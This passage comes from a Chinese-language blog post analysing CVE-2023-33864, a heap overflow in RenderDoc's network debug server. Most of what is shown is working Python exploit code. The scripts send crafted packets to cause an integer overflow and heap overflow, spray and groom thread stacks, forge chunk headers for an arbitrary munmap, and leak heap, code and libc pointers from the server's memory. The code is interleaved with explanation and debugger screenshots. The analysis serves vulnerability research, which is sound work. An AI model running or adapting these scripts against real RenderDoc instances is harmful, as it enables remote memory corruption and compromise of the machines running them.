        <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">......</span>
  <span class="p">}</span>

  <span class="p">......</span>
  
  <span class="n">m_BufferHead</span> <span class="o">=</span> <span class="n">m_BufferBase</span> <span class="o">+</span> <span class="n">m_BufferSize</span><span class="p">;</span>

  <span class="c1">// read the 128 bytes</span>
  <span class="n">m_ReadOffset</span> <span class="o">+=</span> <span class="mi">128</span><span class="p">;</span>
  <span class="kt">bool</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">**</span><span class="nf">ReadFromExternal</span><span class="p">(</span><span class="n">m_BufferHead</span> <span class="o">-</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span> <span class="c1">// 第二处，对m_BufferBase溢出**</span>

  <span class="c1">// memcpy it where it's needed</span>
  <span class="k">if</span><span class="p">(</span><span class="n">dest</span> <span class="o">&amp;&amp;</span> <span class="n">ret</span><span class="p">)</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">m_BufferHead</span> <span class="o">-</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>

  <span class="c1">// adjust read offset back for the 'fake' buffer we leave behind</span>
  <span class="n">m_ReadOffset</span> <span class="o">-=</span> <span class="n">m_BufferSize</span><span class="p">;</span>

  <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>为了精确控制溢出，不至于严重破坏堆的数据结构导致程序不能正常运行，我们不能在两个位置同时造成溢出。</p>

<p>我们可以通过控制 exp 的发送逻辑，仅对 m_BufferBase 进行堆溢出：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span> <span class="o">|</span> <span class="n">ChunkCallstackFlag</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xff</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x200</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00\x00\x00\x01</span><span class="sh">'</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xfe</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
<span class="c1"># 第一次 send，仅发送 16MB数据，虽然此时已经整数溢出，但确保了 string buffer 不发生溢出，
# 因为只发送了 16MB 数据，没有多余的可供 ReadFromExternal 第二轮接收
</span><span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>

<span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x10050</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x145</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x26</span>
<span class="n">packet</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xfffffffffec12000</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x1bef007</span><span class="p">)</span>
<span class="c1"># 第二次 send，此时已经发生了整数溢出，不仅满足 ReadFromExternal 第一轮接收 128字节，
# ReadFromExternal 函数第二轮接收直接导致了堆溢出
</span><span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="堆排布能力">堆排布能力</h3>

<ul>
  <li>任意长度堆块分配</li>
</ul>

<p>可以通过 callstack size 字段和 callstack 字段控制 server 分配任意长度的堆块保存 callstack：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ChunkCallstackFlag</span> <span class="o">=</span> <span class="mh">0x10000</span>

<span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="c1"># 0x40，callstack部分的长度，长度单位是sizeof(unsigned long)
# b'\xff' * 0x200，callstack内容
</span><span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span> <span class="o">|</span> <span class="n">ChunkCallstackFlag</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xff</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x200</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00\x00\x00\x01</span><span class="sh">'</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xfe</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>

<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>堆块释放</li>
</ul>

<p>TargetControlServerThread 函数是 TCP 线程的主逻辑，它会检查连接进来的 client 是否符合建立调试线程的条件。</p>

<p>若不满足条件，则重新回到while循环的开始，继续监听套接字连接。这个过程会释放掉本轮产生m_BufferBase、string buffer、callstack。</p>

<h2 id="漏洞利用思路">漏洞利用思路</h2>

<p>利用堆溢出可以覆盖相邻堆块的 prev_size 字段和 size 字段，运用 <a href="http://tukan.farm/2016/07/27/munmap-madness/">House-of-Muney-Heap-Exploitation</a> 思路构造任意地址 munmap，把堆溢出转化成 UAF。</p>

<ol>
  <li>
    <p>当 librenderdoc.so 的 TCP 线程创建时，glibc 会 mmap 出一个64MB的空间作为线程的堆，堆区域到其他库文件的映射区域之间存在一片未使用的虚拟内存区域，这片未使用的内存区域被称为GAP。</p>

    <p>若 TCP 线程又创建其他线程，子线程的栈区域就从 libraries 边界开始，向低地址方向寻找未使用的内存区域进行开辟。首当其冲的就是 TCP 线程堆到 libraries 映射区域之间的 GAP 区域。</p>
  </li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0                                       64M
----V----------------------------------------V--------------|-------------
    |          server thread's heap          |  random gap  |  libraries
----|----------------------------------------|--------------|-------------
</code></pre></div></div>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_15.33.02.png" alt="截屏2025-05-27 15.33.02.png" /></p>

<ol>
  <li>
    <p>连续创建/退出 15个 client 调试线程，每个线程都会在当前进程的地址空间分配 8MB + 4KB 的栈空间。这么做的目的是通过内存泄漏把 GAP 消耗殆尽， 起到定位 victim stack 的作用，具体在第 4 步中介绍。</p>

    <p>能这么做的是因为程序在处理 client 主动退出的情况时，没有调用 pthread_join 回收栈空间，导致了内存泄漏。</p>
  </li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
        <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">root</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">thread stack leak </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<ol>
  <li>起一个新的连接，这个连接虽然不会起调试线程，但整个过程会分配并释放一个 64KB 的 m_BufferBase 缓存，和一个长度为0x130的 callstack 堆块。</li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span> <span class="o">|</span> <span class="n">ChunkCallstackFlag</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x26</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x01\x01\x01\x01\x01\x01\x01\x01</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x26</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0xe</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">ts588</span><span class="sh">'</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x02</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">54</span>
    
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_20.00.34.png" alt="截屏2025-05-27 20.00.34.png" /></p>

<ol>
  <li>对 m_BufferBase 缓存制造堆溢出，首先第一次 send 把 m_InputSize 变量变成0x400000</li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span> <span class="o">|</span> <span class="n">ChunkCallstackFlag</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xff</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x200</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> \
        <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00\x00\x00\x01</span><span class="sh">'</span> \
        <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xfe</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
    
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
<span class="c1"># 0x90 是溢出边界
# 任意控制相邻堆块的 prev_size 字段和 size 字段
# packet = b'b' * 0x1000
# 0xfffffffffec12000 是 0x13EE000 的负数的补码
# glibc mmap的阈值是16MB
</span><span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x10050</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x145</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x26</span>
<span class="n">packet</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xfffffffffec12000</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x1bef007</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<p>可以看到本轮在旧的callstack的后面分配了新的callstack，长度为0x210。旧的callstack被放到了tcache 里面。形成了如下的堆布局：</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_5_%E9%A1%B5.jpg" alt="renderdoc-第 5 页.jpg" /></p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_20.08.14.png" alt="截屏2025-05-27 20.08.14.png" /></p>

<p>第二次 send 调用，m_BufferBase 缓存发生堆溢出，其中：</p>

<p>old callstack 的 prev_size 和 size 字段保持不变；</p>

<p>new callstack 的 prev_size 字段覆盖为 0xfffffffffec12000，size 字段覆盖为 0x1bef007</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_6_%E9%A1%B5.jpg" alt="renderdoc-第 6 页.jpg" /></p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_20.10.16.png" alt="截屏2025-05-27 20.10.16.png" /></p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_20.15.46.png" alt="截屏2025-05-27 20.15.46.png" /></p>

<p>如此溢出是为了释放 new callstack 缓冲区的时候，绕过 munmap_chunk 的检查，实现任意地址、任意长度内存区域的 munmap。</p>

<p>中间之所以要夹一个释放状态的 old callstack，是因为在释放 new callstack 之前会先释放 m_BufferBase ，要通过相邻的 old callstack 来检查 m_BufferBase 是否被破坏。若中间不夹一个 old callstack 那么释放 m_BufferBase 的时候就会 panic。</p>

<p>当释放 new callstack 的时候，new callstack 本身的地址为 0x7fdcac012000，由于堆溢出 prev_size = 0xfffffffffec12000，size = 0x1bef007，这样不仅绕过了if检查，而且最终的 munmap的参数形态为：__munmap((char *) 0x7fdcad400000, 0x81000);</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">munmap_chunk</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">pagesize</span> <span class="o">=</span> <span class="n">GLRO</span> <span class="p">(</span><span class="n">dl_pagesize</span><span class="p">);</span>
  <span class="n">INTERNAL_SIZE_T</span> <span class="n">size</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
  
  <span class="n">assert</span> <span class="p">(</span><span class="n">chunk_is_mmapped</span> <span class="p">(</span><span class="n">p</span><span class="p">));</span>
	<span class="p">...</span>
  <span class="kt">uintptr_t</span> <span class="n">mem</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
  <span class="kt">uintptr_t</span> <span class="n">block</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">p</span> <span class="o">-</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
  <span class="kt">size_t</span> <span class="n">total_size</span> <span class="o">=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">+</span> <span class="n">size</span><span class="p">;</span>
  
  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">((</span><span class="n">block</span> <span class="o">|</span> <span class="n">total_size</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pagesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span>
      <span class="o">||</span> <span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="o">!</span><span class="n">powerof2</span> <span class="p">(</span><span class="n">mem</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pagesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))))</span>
    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"munmap_chunk(): invalid pointer"</span><span class="p">);</span>
	<span class="p">...</span>
  <span class="n">__munmap</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">block</span><span class="p">,</span> <span class="n">total_size</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>因此造成了任意地址 munmap，在 GAP 内存区域得到了一块未被映射的内存。</p>

<p>在前面的第 2 步堆喷射中，GAP 区域被全部占满。任意地址 munmap 之后，在 GAP 区域造成了一块长度为 0x81000 的空洞，该空洞距离 new callstack 大约为 19MB。</p>

<p>当下一个 client 调试线程起来的时候，线程栈就会占据这个空洞。</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_7_%E9%A1%B5.jpg" alt="renderdoc-第 7 页.jpg" /></p>

<ol>
  <li>
    <p>连接 server ，分配一个 client 调试线程，该线程会占据上述内存空洞。</p>

    <p>这个线程对应的 client name 是 “tmptmp”，该线程后面是要被替换掉的。</p>
  </li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">tmp_thread</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">tmptmp</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">th_tmp</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">tmp_thread</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">th_tmp</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
</code></pre></div></div>

<ol>
  <li>重新连接 server ，再起一个 client 调试线程，这个线程要做 3 件事情：
    <ul>
      <li>踢掉前面的 tmptmp 线程</li>
      <li>分配长度为 0xdee870 的 client name 字符串（大约 13MB）</li>
      <li>起了新的调试线程代替之前的 tmptmp线程</li>
    </ul>
  </li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">long_live_thread</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> \
        <span class="nf">p32</span><span class="p">(</span><span class="mh">0xdee870</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x03</span><span class="sh">'</span> <span class="o">*</span>  <span class="mh">0xdee870</span>
        
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="c1"># kick 字段设置为1，表示踢掉前面的 tmptmp 线程
</span>    <span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x04</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">th_long_live</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">long_live_thread</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">th_long_live</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
</code></pre></div></div>

<p>踢掉 tmptmp 线程是为了回收内存空洞，设置 kick 字段为1，server 就会对 tmptmp 线程调用pthread_join 回收线程资源，0x81000 的栈就会被 pthread 回收，这个回收并不是释放给系统，而是加入到了 pthread 维护的一个链表，下次 pthread_create 线程的时候从链表中取出给新的线程使用。</p>

<p>分配长度为 0xdee870 的 client name。</p>

<p>client name 会被复制一次，因此总共会分配两个连续的堆块用于存放 client name，总长度大约 26MB，正好覆盖到部分的内存空洞。</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_21.31.00.png" alt="截屏2025-05-27 21.31.00.png" /></p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_8_%E9%A1%B5.jpg" alt="renderdoc-第 8 页.jpg" /></p>

<p>这部分内存空洞虽然已被使用，但是归属于 vma 子系统管理，堆管理器并不能感知到这块被任意 munmap出来的区域正在使用。所以在扩展堆空间的时候，直接调用mprotect将这块空洞包含在内的区域设置为RW就返回给 malloc 使用，造成了 client name 侵占部分的空洞。</p>

<p>随后起了新的调试线程替代之前的 tmptmp 线程。新的调试线程从 pthread 维护的链表中取得了刚被释放的长度为0x81000的栈，往这块区域写入了栈数据，覆盖了部分的 client name，后面当server 把 client name 返回给 client 的时候就会把这部分栈数据带出来，其中就包含了攻击者想要的指针信息。</p>

<ol>
  <li>泄漏堆指针、代码段指针、libc 指针</li>
</ol>

<p>这时候再连进去一个 client，kick字段设置为0。</p>

<p>当client进去后发现有调试线程正在运行，由于 kick = 0，server 不起新的调试线程，把已存在的 client name 返回给当前请求。</p>

<p>由于 client name 部分已被调试线程的栈所覆盖，其中必然遗留了代码段地址。</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_21.38.48.png" alt="截屏2025-05-27 21.38.48.png" /></p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_21.51.09.png" alt="截屏2025-05-27 21.51.09.png" /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    
<span class="c1"># do not kick out the long-live thread
</span><span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> \
			   <span class="nf">p32</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">qts588</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
        
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    
<span class="n">recv_buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">recv_buf</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">recv_buf</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x10\x00\x00\x00\x03\x03\x03\x03</span><span class="sh">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
        <span class="k">break</span>
    
<span class="n">tag_index</span> <span class="o">=</span> <span class="n">recv_buf</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x10\x00\x00\x00\x03\x03\x03\x03</span><span class="sh">'</span><span class="p">)</span>
